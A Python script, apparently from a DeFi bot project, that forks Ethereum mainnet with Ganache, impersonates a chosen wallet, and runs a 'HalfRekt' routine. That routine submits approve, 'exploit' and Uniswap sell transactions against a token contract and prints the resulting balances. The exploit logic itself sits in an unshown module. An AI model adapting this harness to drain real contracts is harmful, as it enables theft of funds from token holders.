from multiprocessing import Process
import websockets
import asyncio
import atexit
import time
import json
import certifi

from ganache import start_ganache
from opportunities import HalfRekt
from config import *

from helpers import Uniswap, approve_erc20, transfer_erc20


def process(msg_org):
    msg = json.loads(msg_org)["params"]["result"]
    block_number = int(msg["number"].lstrip("0x"), 16)
    timestamp = int(msg["timestamp"].lstrip("0x"), 16) 
    print(f"Latency: {time.time()-timestamp} | Block: {block_number}")
    check_plans(block_number)


def check_plans(block_number):
    plans = [HalfRekt]
    for plan in plans:
        print(f"Running: {repr(plan)}")
        hf = HalfRekt(block_number, w3, wallet_address)
        response = hf()
        # if payload: send_to_archer(payload)
        print(f"Finished with {plan}")

        return response
    else:
        print("No opportunities!")


def execute(payload):
    gas_price = w3.eth.gasPrice
    nonce = w3.eth.getTransactionCount(wallet_address)
    tx = {
          "gas": payload["gasLimit"],
          "from": wallet_address,
          "to": payload["contractAddress"],
          "data": payload["calldata"]}

    tx_hash = w3.eth.sendTransaction(tx).hex()
    
    return tx_hash  


def ws_receiver(uri, data_request, process_fun):
    time_zero = time.time()

    async def _start_listening():
        
        async with websockets.connect(uri) as websocket:
            await websocket.send(data_request)
            await websocket.recv()
            future_event = None
            while 1:
                print("Starting listening: ", time.time()-time_zero)   
                message = await websocket.recv()
                print("Finished listening: ", time.time()-time_zero)

                if future_event: future_event.kill(); print("Killed process")
                future_event = Process(target=process_fun, args=(message,))
                future_event.start()

    return asyncio.get_event_loop().run_until_complete(_start_listening())


if __name__=="__main__":
    from pprint import pprint
    import requests

    t0 = time.time()
    start_block_number = 10996939
    node_path = NODE_INFO["alchemy"]["html_path"]
    # data_request = NODE_INFO["alchemy"]["ws_blocks_request"]
    
    ganache_process, provider_path, accounts, private_keys = start_ganache(node_path, block_number=start_block_number, mine_interval=3)
    wallet_address = accounts[0]
    atexit.register(lambda: ganache_process.kill())  # Closes the node after python finishes
    wallet_address2 = wallet_address
    wallet_address = "0x2493336E00A8aDFc0eEDD18961A49F2ACAf8793f"
    # provider_path = "http://127.0.0.1:8545"

    # requests.post("http://127.0.0.1:8545", json.dumps({"jsonrpc": "2.0","method": "miner_stop", "params": []}))  # Stop Mining

    w3 = Web3(Web3.HTTPProvider(provider_path))  # Is global!!!
    start_block_number = w3.eth.blockNumber
    halfrekt_address = ADDRESSES["halfrekt"]["halfrekt"]
    print(halfrekt_address)
    print(start_block_number)

    halfrekt_contract = w3.eth.contract(address=halfrekt_address, abi=ABIS[halfrekt_address])
    # ws_receiver(node_path, data_request, pprint)
    # response = check_plans(start_block_number)
    
    # Initial ETH balance
    balance_eth_start = w3.eth.getBalance(wallet_address)
    print(balance_eth_start)
    
    hf = HalfRekt(start_block_number+1, w3, wallet_address)
    response = hf()
    if not response:
        print("No opp found")
        exit()
    
    tx_hash_approve = execute(response["payloads"][0])
    balance_nme = halfrekt_contract.functions.balanceOf(wallet_address).call()
    print("nme balance: ", balance_nme/10**18)
    tx_hash_exploit = execute(response["payloads"][1])

    # # requests.post("http://127.0.0.1:8545", json.dumps({"jsonrpc": "2.0","method": "miner_start", "params": [2]}))  # Continue mining
    tx_reciept_approve = w3.eth.waitForTransactionReceipt(tx_hash_approve)
    allowance = halfrekt_contract.functions.allowance(wallet_address, "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D").call()/10**18
    print(allowance)
    tx_reciept_exploit = w3.eth.waitForTransactionReceipt(tx_hash_exploit)
    balance_nme = halfrekt_contract.functions.balanceOf(wallet_address).call()
    print("nme balance: ", balance_nme/10**18)



    emn_amount = 300
    path = [halfrekt_address, "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"]
    uni = Uniswap(w3)
    eth_out = uni.get_amount_out(emn_amount, "0xddbE1dFC668233bb882014838DAE50deF5Ea967c", inverse=1)
    # trade_payload = uni.get_payload(emn_amount*10**18, 
    #                                  eth_out*10**18, 
    #                                  path, 
    #                                  300000, 
    #                                  wallet_address)
    # tx_hash_trade = execute(trade_payload)
    tx_hash_trade = execute(response["payloads"][2])
    pprint(response["payloads"][2])
    



    tx_reciept_trade = w3.eth.waitForTransactionReceipt(tx_hash_trade)
    balance_eth_end = w3.eth.getBalance(wallet_address)
    print("eth end balance: ", balance_eth_end)
    balance_nme = halfrekt_contract.functions.balanceOf(wallet_address).call()
    print("nme balance: ", balance_nme/10**18)
    pprint(tx_reciept_approve.blockNumber)
    pprint(tx_reciept_exploit.blockNumber)
    pprint(tx_reciept_trade.blockNumber)

    # uni = Uniswap(w3)
    # dai_address = "0x6B175474E89094C44Da98b954EedeAC495271d0F"
    # path = [dai_address, "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"]
    # pool_address = "0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11"
    # dai_amount = 300
    # dai_contract = w3.eth.contract(address=dai_address, abi=ABIS["erc20_token"])
    
    # # print("#"*80)
    # # payload_transfer = transfer_erc20(dai_address, wallet_address2, 300*10**18)
    # # tx_hash = execute(payload_transfer)
    # # tx_reciept = w3.eth.waitForTransactionReceipt(tx_hash)
    # # pprint(tx_reciept)
    # # wallet_address = wallet_address2
    # # print(dai_contract.functions.balanceOf(wallet_address).call()/10**18)
    # # print("#"*80)
    # payload_approve = approve_erc20(dai_address, "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", amount=400*10**18)
    # # pprint(payload_approve)
    # tx_hash = execute(payload_approve)
    # # tx_reciept = w3.eth.waitForTransactionReceipt(tx_hash)
    # # pprint(tx_reciept)
    # # allowance = dai_contract.functions.allowance(wallet_address, "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D").call()/10**18
    # # print(allowance)
    # # if not allowance: exit()
    # print(dai_contract.functions.balanceOf(wallet_address).call()/10**18)
    # bal_eth1 = w3.eth.getBalance(wallet_address)
    # # print(bal_eth1)
    # # print("#"*80)
    # eth_out = uni.get_amount_out(dai_amount, pool_address, inverse=1)
    # print(eth_out/10**18)
    # trade_payload = uni.get_payload(300*10**18, 
    #                                  eth_out*10**18, 
    #                                  path, 
    #                                  400000, 
    #                                  wallet_address)
    # pprint(trade_payload)
    # tx_hash = execute(trade_payload)
    # tx_reciept = w3.eth.waitForTransactionReceipt(tx_hash)
    # # pprint(tx_reciept)
    # bal_eth2 = w3.eth.getBalance(wallet_address)
    # # print(bal_eth2)
    # print("profit:", bal_eth2-bal_eth1)

    # balance_nme = halfrekt_contract.functions.balanceOf(wallet_address).call()
    # tx_reciept3 = execute(response["payloads"][2])


    